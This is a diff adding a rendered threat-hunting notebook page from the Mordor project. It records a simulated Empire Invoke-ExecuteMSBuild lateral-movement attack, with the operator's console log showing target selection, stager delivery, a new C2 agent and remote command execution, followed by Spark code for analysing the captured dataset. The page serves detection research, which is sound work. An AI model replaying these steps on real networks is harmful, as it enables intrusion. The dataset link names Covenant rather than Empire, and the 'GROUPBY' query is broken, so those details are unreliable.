@@ -1,0 +1,313 @@
+---
+redirect_from:
+  - "/notebooks/small/windows/05-defense-evasion/sd-190518213907"
+interact_link: content/notebooks/small/windows/05_defense_evasion/SD-190518213907.ipynb
+kernel_name: 
+kernel_path: content/notebooks/small/windows/05_defense_evasion
+has_widgets: false
+title: |-
+  Empire Invoke Msbuild
+pagenum: 37
+prev_page:
+  url: /notebooks/small/windows/05_defense_evasion/SD-190301125905.html
+next_page:
+  url: /notebooks/small/windows/06_credential_access/credential_access.html
+suffix: .ipynb
+search: empire powershell false apwsr lateralmovement invokeexecutemsbuild agent shire vwthy default mordor tasked ps msbuild dataset proxy name module none username listener run agents hr id windows simulation com description file credentials true password request nmartha pgustavo invoke execution execute xml executing credid computername target set y task parameters sending stage active process metadata sd author roberto rodriguez cybrwardg creation date platform environment type c tool script raw githubusercontent hunters forge master datasets small defenseevasion covenantgruntmsbuild tar gz represents adversaries using trusted utilities such malicious code adversary view usemodule info executemsbuild needsadmin opsecsafe language minlanguageversion background outputextension authors xorrior utilizes wmi
+
+comment: "***PROGRAMMATICALLY GENERATED, DO NOT EDIT. SEE ORIGINAL FILES IN /content***"
+---
+
+    <main class="jupyter-page">
+    <div id="page-info"><div id="page-title">Empire Invoke Msbuild</div>
+</div>
+    <div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Metadata">Metadata<a class="anchor-link" href="#Metadata"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<table>
+<thead><tr>
+<th style="text-align:left"></th>
+<th style="text-align:left"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">id</td>
+<td style="text-align:left">SD-190518213907</td>
+</tr>
+<tr>
+<td style="text-align:left">author</td>
+<td style="text-align:left">Roberto Rodriguez @Cyb3rWard0g</td>
+</tr>
+<tr>
+<td style="text-align:left">creation date</td>
+<td style="text-align:left">2019/05/18</td>
+</tr>
+<tr>
+<td style="text-align:left">platform</td>
+<td style="text-align:left">Windows</td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Environment</td>
+<td style="text-align:left">shire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Type</td>
+<td style="text-align:left">C2</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Tool</td>
+<td style="text-align:left">Empire</td>
+</tr>
+<tr>
+<td style="text-align:left">Simulation Script</td>
+<td style="text-align:left"></td>
+</tr>
+<tr>
+<td style="text-align:left">Mordor Dataset</td>
+<td style="text-align:left"><a href="https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_grunt_msbuild.tar.gz">https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_grunt_msbuild.tar.gz</a></td>
+</tr>
+</tbody>
+</table>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Dataset-Description">Dataset Description<a class="anchor-link" href="#Dataset-Description"> </a></h2><p>This dataset represents adversaries using trusted windows utilities such as msbuild to proxy execution of malicious code.</p>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Adversary-View">Adversary View<a class="anchor-link" href="#Adversary-View"> </a></h2>
+<pre><code>(Empire: V6W3TH8Y) &gt; usemodule lateral_movement/invoke_executemsbuild
+(Empire: powershell/lateral_movement/invoke_executemsbuild) &gt; info
+
+              Name: Invoke-ExecuteMSBuild
+            Module: powershell/lateral_movement/invoke_executemsbuild
+        NeedsAdmin: False
+        OpsecSafe: False
+          Language: powershell
+MinLanguageVersion: 2
+        Background: False
+  OutputExtension: None
+
+Authors:
+  @xorrior
+
+Description:
+  This module utilizes WMI and MSBuild to compile and execute
+  an xml file containing an Empire launcher
+
+Comments:
+  Inspired by @subtee http://subt0x10.blogspot.com/2016/09
+  /bypassing-application-whitelisting.html
+
+Options:
+
+  Name         Required    Value                     Description
+  ----         --------    -------                   -----------
+  UserName     False                                 UserName if executing with credentials  
+  CredID       False                                 CredID from the store to use.           
+  ComputerName True                                  Host to target                          
+  DriveLetter  False                                 Drive letter to use when mounting the   
+                                                    share locally                           
+  ProxyCreds   False       default                   Proxy credentials                       
+                                                    ([domain\]username:password) to use for 
+                                                    request (default, none, or other).      
+  FilePath     False                                 Desired location to copy the xml file on
+                                                    the target                              
+  Agent        True        V6W3TH8Y                  Agent to grab a screenshot from.        
+  Listener     True                                  Listener to use.                        
+  Proxy        False       default                   Proxy to use for request (default, none,
+                                                    or other).                              
+  UserAgent    False       default                   User-agent string to use for the staging
+                                                    request (default, none, or other).      
+  Password     False                                 Password if executing with credentials  
+
+(Empire: powershell/lateral_movement/invoke_executemsbuild) &gt; set ComputerName IT001.shire.com
+(Empire: powershell/lateral_movement/invoke_executemsbuild) &gt; set Listener https
+(Empire: powershell/lateral_movement/invoke_executemsbuild) &gt; execute
+[&gt;] Module is not opsec safe, run? [y/N] y
+[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT
+[*] Agent V6W3TH8Y tasked with task ID 5
+[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_executemsbuild
+(Empire: powershell/lateral_movement/invoke_executemsbuild) &gt; 
+
+__GENUS          : 2
+__CLASS          : __PARAMETERS
+__SUPERCLASS     : 
+__DYNASTY        : __PARAMETERS
+__RELPATH        : 
+__PROPERTY_COUNT : 2
+__DERIVATION     : {}
+__SERVER         : 
+__NAMESPACE      : 
+__PATH           : 
+ProcessId        : 6732
+ReturnValue      : 0
+PSComputerName   : 
+
+
+
+
+[*] Sending POWERSHELL stager (stage 1) to 10.0.10.103
+[*] New agent 38APWSR1 checked in
+[+] Initial agent 38APWSR1 from 10.0.10.103 now active (Slack)
+[*] Sending agent (stage 2) to 38APWSR1 at 10.0.10.103
+
+(Empire: powershell/lateral_movement/invoke_executemsbuild) &gt; agents
+
+[*] Active agents:
+
+Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener
+----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------
+H3DKB8SA ps 172.18.39.106   HR001             SHIRE\nmartha           powershell         5172   5/0.0    2019-05-18 21:39:49  https           
+TKV35P8X ps 172.18.39.106   HR001             *SHIRE\nmartha          powershell         5452   5/0.0    2019-05-18 21:39:49  https           
+EMDBFPSY ps 172.18.39.106   HR001             SHIRE\nmartha           notepad            7924   5/0.0    2019-05-18 21:39:47  https           
+
+V6W3TH8Y ps 172.18.39.106   HR001             SHIRE\pgustavo          powershell         5204   5/0.0    2019-05-18 21:39:50  https           
+38APWSR1 ps 172.18.39.105   IT001             *SHIRE\pgustavo         MSBuild            5656   5/0.0    2019-05-18 21:39:49  https           
+
+(Empire: agents) &gt;
+(Empire: agents) &gt; interact 38APWSR1
+(Empire: 38APWSR1) &gt; shell whoami
+[*] Tasked 38APWSR1 to run TASK_SHELL
+[*] Agent 38APWSR1 tasked with task ID 1
+(Empire: 38APWSR1) &gt; shire\pgustavo
+..Command execution completed.
+
+(Empire: 38APWSR1) &gt;</code></pre>
+
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h2 id="Explore-Mordor-Dataset">Explore Mordor Dataset<a class="anchor-link" href="#Explore-Mordor-Dataset"> </a></h2>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Initialize-Analytics-Engine">Initialize Analytics Engine<a class="anchor-link" href="#Initialize-Analytics-Engine"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="kn">from</span> <span class="nn">openhunt.mordorutils</span> <span class="k">import</span> <span class="o">*</span>
+<span class="n">spark</span> <span class="o">=</span> <span class="n">get_spark</span><span class="p">()</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Download-&amp;-Process-Mordor-File">Download &amp; Process Mordor File<a class="anchor-link" href="#Download-&amp;-Process-Mordor-File"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/defense_evasion/covenant_grunt_msbuild.tar.gz&quot;</span>
+<span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing text_cell rendered"><div class="inner_cell">
+<div class="text_cell_render border-box-sizing rendered_html">
+<h3 id="Get-to-know-your-data">Get to know your data<a class="anchor-link" href="#Get-to-know-your-data"> </a></h3>
+</div>
+</div>
+</div>
+</div>
+
+<div class="jb_cell">
+
+<div class="cell border-box-sizing code_cell rendered">
+<div class="input">
+
+<div class="inner_cell">
+    <div class="input_area">
+<div class=" highlight hl-ipython3"><pre><span></span><span class="n">df</span> <span class="o">=</span> <span class="n">spark</span><span class="o">.</span><span class="n">sql</span><span class="p">(</span>
+            <span class="sd">&#39;&#39;&#39;</span>
+<span class="sd">SELECT channel, COUNT(1)</span>
+<span class="sd">FROM mordorTable</span>
+<span class="sd">GROUPBY channel</span>
+<span class="sd">            &#39;&#39;&#39;</span><span class="p">)</span>
+<span class="n">df</span><span class="o">.</span><span class="n">show</span><span class="p">()</span>
+        
+</pre></div>
+
+    </div>
+</div>
+</div>
+
+</div>
+</div>
+
+ 
+
+
+    </main>
+    
